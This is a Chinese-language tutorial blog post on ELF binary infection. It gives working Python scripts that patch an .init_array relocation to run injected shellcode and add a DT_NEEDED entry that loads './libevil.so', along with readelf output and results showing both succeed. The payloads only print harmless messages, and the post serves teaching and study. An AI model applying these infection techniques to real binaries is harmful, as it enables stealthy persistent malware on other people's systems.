# elf感染注入

## 劫持.init_array指针

简单编写一个程序

```c
#include <stdio.h>

void __attribute__((constructor)) initarr(){
    printf("Initializing array\n");    
}

int main(){
    printf("Hello, World!\n");
    return 0;
}
```

使用`gcc -o elf_infection elf_infection.c`编译

使用`readelf -d elf_infection`

```c
daydream@dayDReam:~$ readelf -d elf_infection

Dynamic section at offset 0x2dc8 contains 27 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x1000
 0x000000000000000d (FINI)               0x1184
 0x0000000000000019 (INIT_ARRAY)         0x3db0
 0x000000000000001b (INIT_ARRAYSZ)       16 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x3dc0
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3b0
 0x0000000000000005 (STRTAB)             0x480
 0x0000000000000006 (SYMTAB)             0x3d8
 0x000000000000000a (STRSZ)              141 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x3fb8
 0x0000000000000002 (PLTRELSZ)           24 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x628
 0x0000000000000007 (RELA)               0x550
 0x0000000000000008 (RELASZ)             216 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000000000001e (FLAGS)              BIND_NOW
 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
 0x000000006ffffffe (VERNEED)            0x520
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x50e
 0x000000006ffffff9 (RELACOUNT)          4
 0x0000000000000000 (NULL)               0x0
daydream@dayDReam:~$ 
```

可以看到`init_array`位于`0x3db0`，但是显然动态链接时`init_array`的指针是需要重定位的，所以我们可以通过`patch`重定位表来做到劫持，我们使用`readelf -r elf_infection`确认`r_addend`

```c
daydream@dayDReam:~$ readelf -r elf_infection

Relocation section '.rela.dyn' at offset 0x550 contains 9 entries:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000003db0  000000000008 R_X86_64_RELATIVE                    1140
000000003db8  000000000008 R_X86_64_RELATIVE                    1149
000000003dc0  000000000008 R_X86_64_RELATIVE                    1100
000000004008  000000000008 R_X86_64_RELATIVE                    4008
000000003fd8  000100000006 R_X86_64_GLOB_DAT 0000000000000000 __libc_start_main@GLIBC_2.34 + 0
000000003fe0  000200000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_deregisterTM[...] + 0
000000003fe8  000400000006 R_X86_64_GLOB_DAT 0000000000000000 __gmon_start__ + 0
000000003ff0  000500000006 R_X86_64_GLOB_DAT 0000000000000000 _ITM_registerTMCl[...] + 0
000000003ff8  000600000006 R_X86_64_GLOB_DAT 0000000000000000 __cxa_finalize@GLIBC_2.2.5 + 0

Relocation section '.rela.plt' at offset 0x628 contains 1 entry:
  Offset          Info           Type           Sym. Value    Sym. Name + Addend
000000003fd0  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
daydream@dayDReam:~$ 
```

```text
0x550  r_offset = 0x3db0   8 字节
0x558  r_info   = 0x8      8 字节
0x560  r_addend = 0x1140   8 字节   
```

记住要改的地方的偏移是`0x550+16=0x560`

其次，我们要劫持的目的函数是哪里呢，我们需要找一个有足够大小和可执行的段之间的空隙，把我们的机器码写进去，让`Addend`指向这里

```asm
.intel_syntax noprefix
.section .text
.global my_init
my_init:
    mov rax, 1              # syscall 号 1 是 write
    mov rdi, 1              # fd 1 是 stdout
    lea rsi, [rip + msg]    # buf = msg 的地址
    mov rdx, 9              # 长度 9 字节
    syscall                 # 触发系统调用
    ret                     # 返回

msg:
    .ascii "hijacked\n"
```

编写如上例函数，查看其机器码知大小为40字节，我们可以使用`readelf -S elf_infection`确认节之间间隙和段间隙

```text
daydream@dayDReam:~$ readelf -S elf_infection
There are 31 section headers, starting at offset 0x36c0:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000000318  00000318
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.gnu.pr[...] NOTE             0000000000000338  00000338
       0000000000000030  0000000000000000   A       0     0     8
  [ 3] .note.gnu.bu[...] NOTE             0000000000000368  00000368
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .note.ABI-tag     NOTE             000000000000038c  0000038c
       0000000000000020  0000000000000000   A       0     0     4
  [ 5] .gnu.hash         GNU_HASH         00000000000003b0  000003b0
       0000000000000024  0000000000000000   A       6     0     8
  [ 6] .dynsym           DYNSYM           00000000000003d8  000003d8
       00000000000000a8  0000000000000018   A       7     1     8
  [ 7] .dynstr           STRTAB           0000000000000480  00000480
       000000000000008d  0000000000000000   A       0     0     1
  [ 8] .gnu.version      VERSYM           000000000000050e  0000050e
       000000000000000e  0000000000000002   A       6     0     2
  [ 9] .gnu.version_r    VERNEED          0000000000000520  00000520
       0000000000000030  0000000000000000   A       7     1     8
  [10] .rela.dyn         RELA             0000000000000550  00000550
       00000000000000d8  0000000000000018   A       6     0     8
  [11] .rela.plt         RELA             0000000000000628  00000628
       0000000000000018  0000000000000018  AI       6    24     8
  [12] .init             PROGBITS         0000000000001000  00001000
       000000000000001b  0000000000000000  AX       0     0     4
  [13] .plt              PROGBITS         0000000000001020  00001020
       0000000000000020  0000000000000010  AX       0     0     16
  [14] .plt.got          PROGBITS         0000000000001040  00001040
       0000000000000010  0000000000000010  AX       0     0     16
  [15] .plt.sec          PROGBITS         0000000000001050  00001050
       0000000000000010  0000000000000010  AX       0     0     16
  [16] .text             PROGBITS         0000000000001060  00001060
       0000000000000121  0000000000000000  AX       0     0     16
  [17] .fini             PROGBITS         0000000000001184  00001184
       000000000000000d  0000000000000000  AX       0     0     4
  [18] .rodata           PROGBITS         0000000000002000  00002000
       0000000000000025  0000000000000000   A       0     0     4
  [19] .eh_frame_hdr     PROGBITS         0000000000002028  00002028
       000000000000003c  0000000000000000   A       0     0     4
  [20] .eh_frame         PROGBITS         0000000000002068  00002068
       00000000000000cc  0000000000000000   A       0     0     8
  [21] .init_array       INIT_ARRAY       0000000000003db0  00002db0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .fini_array       FINI_ARRAY       0000000000003dc0  00002dc0
       0000000000000008  0000000000000008  WA       0     0     8
  [23] .dynamic          DYNAMIC          0000000000003dc8  00002dc8
       00000000000001f0  0000000000000010  WA       7     0     8
  [24] .got              PROGBITS         0000000000003fb8  00002fb8
       0000000000000048  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000004000  00003000
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000004010  00003010
       0000000000000008  0000000000000000  WA       0     0     1
  [27] .comment          PROGBITS         0000000000000000  00003010
       000000000000002d  0000000000000001  MS       0     0     1
  [28] .symtab           SYMTAB           0000000000000000  00003040
       0000000000000378  0000000000000018          29    18     8
  [29] .strtab           STRTAB           0000000000000000  000033b8
       00000000000001eb  0000000000000000           0     0     1
  [30] .shstrtab         STRTAB           0000000000000000  000035a3
       000000000000011a  0000000000000000           0     0     1
```

可以看到唯一足够大小的处于

```text
[17] .fini             PROGBITS         0000000000001184  00001184
       000000000000000d  0000000000000000  AX       0     0     4
[18] .rodata           PROGBITS         0000000000002000  00002000
       0000000000000025  0000000000000000   A       0     0     4
```

使用`readelf -l elf_infection`查看该段空隙之间是否具有执行权限

```c
There are 13 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x00000000000002d8 0x00000000000002d8  R      0x8
  INTERP         0x0000000000000318 0x0000000000000318 0x0000000000000318
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000640 0x0000000000000640  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x0000000000000191 0x0000000000000191  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x0000000000000134 0x0000000000000134  R      0x1000
  LOAD           0x0000000000002db0 0x0000000000003db0 0x0000000000003db0
                 0x0000000000000260 0x0000000000000268  RW     0x1000
  DYNAMIC        0x0000000000002dc8 0x0000000000003dc8 0x0000000000003dc8
                 0x00000000000001f0 0x00000000000001f0  RW     0x8
  NOTE           0x0000000000000338 0x0000000000000338 0x0000000000000338
                 0x0000000000000030 0x0000000000000030  R      0x8
  NOTE           0x0000000000000368 0x0000000000000368 0x0000000000000368
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_PROPERTY   0x0000000000000338 0x0000000000000338 0x0000000000000338
                 0x0000000000000030 0x0000000000000030  R      0x8
  GNU_EH_FRAME   0x0000000000002028 0x0000000000002028 0x0000000000002028
                 0x000000000000003c 0x000000000000003c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000002db0 0x0000000000003db0 0x0000000000003db0
                 0x0000000000000250 0x0000000000000250  R      0x1

 Section to Segment mapping:
  Segment Sections...
   00     
   01     .interp 
   02     .interp .note.gnu.property .note.gnu.build-id .note.ABI-tag .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt 
   03     .init .plt .plt.got .plt.sec .text .fini 
   04     .rodata .eh_frame_hdr .eh_frame 
   05     .init_array .fini_array .dynamic .got .data .bss 
   06     .dynamic 
   07     .note.gnu.property 
   08     .note.gnu.build-id .note.ABI-tag 
   09     .note.gnu.property 
   10     .eh_frame_hdr 
   11     
   12     .init_array .fini_array .dynamic .got 
daydream@dayDReam:~$ 
```

那确实是有的

编写patch.py进行patch即可

```py
import struct

code = bytes.fromhex(
    "48c7c001000000"      # mov rax, 1
    "48c7c701000000"      # mov rdi, 1
    "488d350a000000"      # lea rsi, [rip+0xa]
    "48c7c209000000"      # mov rdx, 9
    "0f05"                # syscall
    "c3"                  # ret
    "68696a61636b65640a"  # "hijacked\n"
)

HOLE = 0x1191
RELA_ADDEND = 0x560

with open("elf_infection", "r+b") as f:
    f.seek(HOLE)
    f.write(code)
    f.seek(RELA_ADDEND)
    f.write(struct.pack("<Q", HOLE))

print("patched")
```

这里取`0x1191`是因为`0x1184+0xd=0x1191`

```text
[17] .fini             PROGBITS         0000000000001184  00001184
       000000000000000d  0000000000000000  AX       0     0     4
[18] .rodata           PROGBITS         0000000000002000  00002000
       0000000000000025  0000000000000000   A       0     0     4
```

执行`patch.py`再执行`./elf_infection`

得到结果

```text
daydream@dayDReam:~$ python3 patch.py
patched
daydream@dayDReam:~$ ./elf_infection 
hijacked
Initializing array
Hello, World!
daydream@dayDReam:~$ 
```

## DT_NEEDED 注入

我们知道`ld.so` 根据 `.dynamic` 加载依赖库，它遍历其中的条目，每遇到一条 `DT_NEEDED`，就去 `.dynstr` 中读取对应的库名并加载 所以要注入一个新的共享库，需要在 `.dynamic` 中新增一条 `DT_NEEDED`，并在 `.dynstr` 中追加对应的库名字符串

```text
daydream@dayDReam:~$ readelf -S elf_infection
There are 31 section headers, starting at offset 0x36c0:

Section Headers:
  [Nr] Name              Type             Address           Offset
       Size              EntSize          Flags  Link  Info  Align
  [ 0]                   NULL             0000000000000000  00000000
       0000000000000000  0000000000000000           0     0     0
  [ 1] .interp           PROGBITS         0000000000000318  00000318
       000000000000001c  0000000000000000   A       0     0     1
  [ 2] .note.gnu.pr[...] NOTE             0000000000000338  00000338
       0000000000000030  0000000000000000   A       0     0     8
  [ 3] .note.gnu.bu[...] NOTE             0000000000000368  00000368
       0000000000000024  0000000000000000   A       0     0     4
  [ 4] .note.ABI-tag     NOTE             000000000000038c  0000038c
       0000000000000020  0000000000000000   A       0     0     4
  [ 5] .gnu.hash         GNU_HASH         00000000000003b0  000003b0
       0000000000000024  0000000000000000   A       6     0     8
  [ 6] .dynsym           DYNSYM           00000000000003d8  000003d8
       00000000000000a8  0000000000000018   A       7     1     8
  [ 7] .dynstr           STRTAB           0000000000000480  00000480
       000000000000008d  0000000000000000   A       0     0     1
  [ 8] .gnu.version      VERSYM           000000000000050e  0000050e
       000000000000000e  0000000000000002   A       6     0     2
  [ 9] .gnu.version_r    VERNEED          0000000000000520  00000520
       0000000000000030  0000000000000000   A       7     1     8
  [10] .rela.dyn         RELA             0000000000000550  00000550
       00000000000000d8  0000000000000018   A       6     0     8
  [11] .rela.plt         RELA             0000000000000628  00000628
       0000000000000018  0000000000000018  AI       6    24     8
  [12] .init             PROGBITS         0000000000001000  00001000
       000000000000001b  0000000000000000  AX       0     0     4
  [13] .plt              PROGBITS         0000000000001020  00001020
       0000000000000020  0000000000000010  AX       0     0     16
  [14] .plt.got          PROGBITS         0000000000001040  00001040
       0000000000000010  0000000000000010  AX       0     0     16
  [15] .plt.sec          PROGBITS         0000000000001050  00001050
       0000000000000010  0000000000000010  AX       0     0     16
  [16] .text             PROGBITS         0000000000001060  00001060
       0000000000000121  0000000000000000  AX       0     0     16
  [17] .fini             PROGBITS         0000000000001184  00001184
       000000000000000d  0000000000000000  AX       0     0     4
  [18] .rodata           PROGBITS         0000000000002000  00002000
       0000000000000025  0000000000000000   A       0     0     4
  [19] .eh_frame_hdr     PROGBITS         0000000000002028  00002028
       000000000000003c  0000000000000000   A       0     0     4
  [20] .eh_frame         PROGBITS         0000000000002068  00002068
       00000000000000cc  0000000000000000   A       0     0     8
  [21] .init_array       INIT_ARRAY       0000000000003db0  00002db0
       0000000000000010  0000000000000008  WA       0     0     8
  [22] .fini_array       FINI_ARRAY       0000000000003dc0  00002dc0
       0000000000000008  0000000000000008  WA       0     0     8
  [23] .dynamic          DYNAMIC          0000000000003dc8  00002dc8
       00000000000001f0  0000000000000010  WA       7     0     8
  [24] .got              PROGBITS         0000000000003fb8  00002fb8
       0000000000000048  0000000000000008  WA       0     0     8
  [25] .data             PROGBITS         0000000000004000  00003000
       0000000000000010  0000000000000000  WA       0     0     8
  [26] .bss              NOBITS           0000000000004010  00003010
       0000000000000008  0000000000000000  WA       0     0     1
  [27] .comment          PROGBITS         0000000000000000  00003010
       000000000000002d  0000000000000001  MS       0     0     1
  [28] .symtab           SYMTAB           0000000000000000  00003040
       0000000000000378  0000000000000018          29    18     8
  [29] .strtab           STRTAB           0000000000000000  000033b8
       00000000000001eb  0000000000000000           0     0     1
  [30] .shstrtab         STRTAB           0000000000000000  000035a3
       000000000000011a  0000000000000000           0     0     1
Key to Flags:
  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),
  L (link order), O (extra OS processing required), G (group), T (TLS),
  C (compressed), x (unknown), o (OS specific), E (exclude),
  D (mbind), l (large), p (processor specific)
daydream@dayDReam:~$ readelf -d elf_infection

Dynamic section at offset 0x2dc8 contains 27 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x1000
 0x000000000000000d (FINI)               0x1184
 0x0000000000000019 (INIT_ARRAY)         0x3db0
 0x000000000000001b (INIT_ARRAYSZ)       16 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x3dc0
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3b0
 0x0000000000000005 (STRTAB)             0x480
 0x0000000000000006 (SYMTAB)             0x3d8
 0x000000000000000a (STRSZ)              141 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x3fb8
 0x0000000000000002 (PLTRELSZ)           24 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x628
 0x0000000000000007 (RELA)               0x550
 0x0000000000000008 (RELASZ)             216 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000000000001e (FLAGS)              BIND_NOW
 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
 0x000000006ffffffe (VERNEED)            0x520
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x50e
 0x000000006ffffff9 (RELACOUNT)          4
 0x0000000000000000 (NULL)               0x0
```

收集完信息，我们发现有个问题，`.dynstr`后面已经完全紧凑，无法再追加字符串了，但是没关系，带R的空段有的是，我们直接复制一份并在尾部追加，改一下

```text
 0x0000000000000005 (STRTAB)             0x480
 0x000000000000000a (STRSZ)              141 (bytes)
```

`.dynamic`段我们通过看`readelf -S elf_infection`

```text
[23] .dynamic          DYNAMIC          0000000000003dc8  00002dc8
       00000000000001f0  0000000000000010  WA       7     0     8
```

这里可以看见`Size`是`0x01f0`且知道每个结构体大小是`16`字节，那么我们可以计算出来这里是一共有31个位置，那就比较好了，`dynamic`段后方还有余下位置的话，我们可以考虑把最后一个`NULL`切成我们的`DT_NEEDED`，后一条空的切成NULL就行，对了，`ld.so`的加载时是根据路径一步步搜索的，但是你写个路径进去他就会直接找了，我这里就是写了个`./libevil.so`

```py
import struct

DYNAMIC_OFF = 0x2dc8
DYNAMIC_SIZE = 0x1f0
DYNSTR_OFF = 0x480
DYNSTR_SIZE = 0x8d
DYNSTR_NEW = 0x640

new_str = b"./libevil.so\x00"
new_str_off = DYNSTR_SIZE

with open("elf_infection", "rb") as f:
    f.seek(DYNSTR_OFF)
    dynstr = f.read(DYNSTR_SIZE)
    f.seek(DYNAMIC_OFF)
    dyn = f.read(DYNAMIC_SIZE)

strtab_val_off = None
strsz_val_off = None
null_off = None

for i in range(0, len(dyn), 16):
    d_tag = struct.unpack_from("<q", dyn, i)[0]
    if d_tag == 5:
        strtab_val_off = DYNAMIC_OFF + i + 8
    elif d_tag == 10:
        strsz_val_off = DYNAMIC_OFF + i + 8
    elif d_tag == 0:
        null_off = DYNAMIC_OFF + i
        break

print(f"DT_STRTAB val at {hex(strtab_val_off)}")
print(f"DT_STRSZ  val at {hex(strsz_val_off)}")
print(f"DT_NULL   at     {hex(null_off)}")

with open("elf_infection", "r+b") as f:
    f.seek(DYNSTR_NEW)
    f.write(dynstr)
    f.write(new_str)

    f.seek(strtab_val_off)
    f.write(struct.pack("<Q", DYNSTR_NEW))

    f.seek(strsz_val_off)
    f.write(struct.pack("<Q", DYNSTR_SIZE + len(new_str)))

    f.seek(null_off)
    f.write(struct.pack("<QQ", 1, new_str_off))

    f.seek(null_off + 16)
    f.write(struct.pack("<QQ", 0, 0))

print("patched")
```

随手写一个`evil.c`

```c
#include <stdio.h>

void __attribute__((constructor)) evil_init(void) {
    printf("evil loaded\n");
}

gcc -shared -fPIC -o libevil.so evil.c
```

编译完执行脚本得到

```c
daydream@dayDReam:~$ ./elf_infection 
evil loaded
Initializing array
Hello, World!
daydream@dayDReam:~$ 
```

```text
daydream@dayDReam:~$ readelf -d elf_infection

Dynamic section at offset 0x2dc8 contains 28 entries:
  Tag        Type                         Name/Value
 0x0000000000000001 (NEEDED)             Shared library: [libc.so.6]
 0x000000000000000c (INIT)               0x1000
 0x000000000000000d (FINI)               0x1184
 0x0000000000000019 (INIT_ARRAY)         0x3db0
 0x000000000000001b (INIT_ARRAYSZ)       16 (bytes)
 0x000000000000001a (FINI_ARRAY)         0x3dc0
 0x000000000000001c (FINI_ARRAYSZ)       8 (bytes)
 0x000000006ffffef5 (GNU_HASH)           0x3b0
 0x0000000000000005 (STRTAB)             0x640
 0x0000000000000006 (SYMTAB)             0x3d8
 0x000000000000000a (STRSZ)              154 (bytes)
 0x000000000000000b (SYMENT)             24 (bytes)
 0x0000000000000015 (DEBUG)              0x0
 0x0000000000000003 (PLTGOT)             0x3fb8
 0x0000000000000002 (PLTRELSZ)           24 (bytes)
 0x0000000000000014 (PLTREL)             RELA
 0x0000000000000017 (JMPREL)             0x628
 0x0000000000000007 (RELA)               0x550
 0x0000000000000008 (RELASZ)             216 (bytes)
 0x0000000000000009 (RELAENT)            24 (bytes)
 0x000000000000001e (FLAGS)              BIND_NOW
 0x000000006ffffffb (FLAGS_1)            Flags: NOW PIE
 0x000000006ffffffe (VERNEED)            0x520
 0x000000006fffffff (VERNEEDNUM)         1
 0x000000006ffffff0 (VERSYM)             0x50e
 0x000000006ffffff9 (RELACOUNT)          4
 0x0000000000000001 (NEEDED)             0x8d
 0x0000000000000000 (NULL)               0x0
```

如我们所预料的一样，但是有人要疑惑为什么这里是`0x8d`变成偏移了，这是因为`readelf`没读到段间隙导致的，文件是正常的

后续还有

```text
- `PT_NOTE` 转 `PT_LOAD`
- 文本段扩展
- 代码洞
- 改 `e_entry`
- 加新节
- 反向文本感染
- 寄生代码
- 符号表操纵
- `DT_INIT` 劫持
- `DT_FINI` 劫持
- `.fini_array` 劫持
- `GOT` 覆写
- `PLT` 覆写
- `ret2dlresolve`
- `link_map` 篡改
- 动态链接器劫持
```

我会慢慢更新
